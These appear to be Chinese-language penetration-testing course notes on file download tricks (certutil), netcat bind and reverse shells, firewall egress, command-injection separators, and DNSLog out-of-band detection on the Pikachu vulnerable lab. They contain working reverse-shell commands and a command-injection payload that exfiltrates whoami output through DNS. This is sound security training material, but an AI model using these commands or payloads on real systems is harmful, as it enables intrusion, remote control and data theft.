Day05 基础入门-反弹SHELL&不回显带外&正反向连接&防火墙出入站&文件下载
=
案例
-
1.	文件上传下载-解决无图形化&解决数据传输
2.	反弹Shell命令-解决数据回显&解决数据通讯
3.	防火墙绕过-正向连接&反向连接&内网服务器
4.	防火墙组合数据不回显-ICMP带外查询DNS log

#常规基本渗透命令详解
-
常用命令  
<https://blog.csdn.net/weixin_43303273/article/details/83029138>  
#实用案例1:文件上传下载-解决无图形化&解决数据传输  
命令生成:  
<https://forum.ywhack.com/bountytips.php?download>  
Linux : wget curl python rubyperl java等  
Windows : PowerShell Certutil Bitsadmin msiexec mshta rundll32等

Certutil本质是一个管理证书、证书服务和密钥存储的工具，不过被玩坏了，可以用这个来.下载文件。
certutil.exe -urlcache -split -f http://example.com/file.txt file.txt

#实用案例2:反弹shell命令-解决数据回显&解决数据通讯命令生成:
<https://forum.ywhack.com/shell.php>

Netcat（简称nc）是一款功能强大的网络工具，在网络管理、渗透测试以及安全评估等领域有着广泛应用，常被称为 “网络瑞士军刀”。
Netcat 可以用于远程执行命令。
可在此处下载Windows版本的Netcat
<https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip>

1、正向连接 本地监听，等待对方连接
 	Linux控制Windows
ncat -e cmd -lvp 5566
Windows绑定CMD到本地5566端口
ncat ip 5566
Linux主动连接目标

 	Windows控制Linux
ncat -e /bin/sh-lvp 5566
绑定sh到本地5566端口
nc 47.94.236.117 5566
主动连接目标

2、反向连接 主动给出去，对方监听
 	Linux主动给出
ncat -e /bin/sh 接收者IP 5566
Linux绑定sh到目标5566端口
nc -lvvp 5566
Windows监听5566连接

 	Windows主动给出
ncat -e cmd 接收者IP 5566
Windows绑定CMD到目标5566端口 
nc -lvvp 5566
Linux监听5566连接
受制于NAT这个万恶的东西， 内网的机器只能主动找其他主机。

	|	||	&	&&	；	``
Linux	可用
Windows	可用	不可用

1.	| （管道符号 前面每一个进程的输出直接作为下一个进程的输入 ）
例如，使用管道可以将文件内容通过`cat`命令输出，并通过`grep`命令进行筛选：
cat file.txt | grep "keyword"
https://blog.csdn.net/zhangkunls/article/details/143167921
2.	||（逻辑或）
command1 || command2
如果 command1 执行失败（返回一个非零状态码），则 command2 会被执行。如果 command1 执行成功（返回零状态码），则 command2 不会被执行。
3.	&&（逻辑与）
https://blog.csdn.net/dessler/article/details/142343304
4.	&（后台任务符号）
在Linux中，当你在命令的末尾添加“&”时，该命令会在后台运行，这样你就可以继续在同一个终端上进行其他操作，而不会因为该命令的执行而被阻塞。
5.	；
Linux系统中的分号（;）用于在命令行中分隔多个命令，使得这些命令可以顺序执行。
6.	``
``中的内容执行后替换
实战：
Windows Server 部署Pikachu漏洞练习平台，打开RCE-exec“ping”
1、	下载源码
2、	添加网站并上传源码
3、	找到Pikachu漏洞练习平台中的RCE-exec“ping”
4、	利用符号进行漏洞利用

关键词：防火墙的出站和入站限制

存在漏洞，但是数据不回显：
1、	反弹shell
2、	带外查询

http://www.dnslog.cn/是一个提供 DNSLog 服务的网站。
DNSLog 是一种利用 DNS 协议记录相关信息来进行安全测试、漏洞挖掘等的技术手段。在安全测试场景中：
当测试人员想要探测目标系统是否存在某些漏洞（如命令执行漏洞）时，若在目标系统中执行的命令能够触发向特定域名发起 DNS 查询请求，通过在 “dnslog.cn” 这类平台上点击”Get SubDomain”创建唯一标识的域名，就可以通过查看该平台上的 DNS 查询记录，确认目标系统是否执行了特定命令，以此来判断漏洞是否存在。

Windows的cmd不能使用``，所以我们可以用powershell来定义变量：
$a=whoami
echo $a
上述输出结果为当前用户。
$x=whoami;$y=ipconfig
$x+$y
上述输出结果为当前用户和Windows IP 配置
$xx=$x.replace('\','x');
上述语句作用是把$x中的\替换成x，并赋值给$xx变量
上面的语句中分号是作为每条命令的结束，这些功能是cmd所不具备的。


当数据不能回显时
看一下是否能正确执行命令
在pikachu漏洞练习平台模拟让服务器向dnslog.cn发起请求
Rce-ping构造恶意语句
127.0.0.1 | powershell.exe $a=whoami;$aa=$a.replace('\','x');$bb='.dbwph8.dnslog.cn';$c=$aa+$bb;ping $c;
这时候刷新，dnslog就会出现记录
